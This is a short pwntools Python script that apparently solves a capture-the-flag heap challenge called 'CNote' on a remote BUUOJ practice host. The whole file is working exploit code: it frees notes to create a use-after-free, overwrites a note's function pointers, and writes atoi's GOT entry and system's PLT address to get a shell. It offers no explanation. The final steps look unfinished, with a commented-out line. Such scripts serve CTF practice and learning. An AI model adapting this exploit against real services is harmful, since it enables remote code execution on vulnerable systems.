from pwn import *

def addtext(idx,size,data):
    io.recvuntil('CNote > ')
    io.sendline('1')
    io.recvuntil('Index > ')
    io.sendline(str(idx))
    io.sendline('2')
    io.recvuntil('Length > ')
    io.sendline(str(size))
    io.recvuntil('Value > ')
    io.sendline(data)

def addint(idx,data):
    io.recvuntil('CNote > ')
    io.sendline('1')
    io.recvuntil('Index > ')
    io.sendline(str(idx))
    io.sendline('1')
    io.sendline(str(data))

def free(idx):
    io.recvuntil('CNote > ')
    io.sendline('2')
    io.recvuntil('Index > ')
    io.sendline(str(idx))  

prtstr=0x80486DE
prtint=0x80486BE
freeint=0x80486FE
puts_got=0x804B024
atoi_got=0x804B038
sys_plt=0x8048500

io=remote('node3.buuoj.cn',28463)

addint(0,1)
addint(1,2)
free(0)
free(1)
addtext(2,12,p32(prtint)+p32(freeint))
free(0)
free(2)

addtext(3,12,p32(atoi_got))
addtext(4,12,p32(sys_plt))



#add(2,12,p32(pri_add)+p32(pri_add)+p8(10))


io.interactive()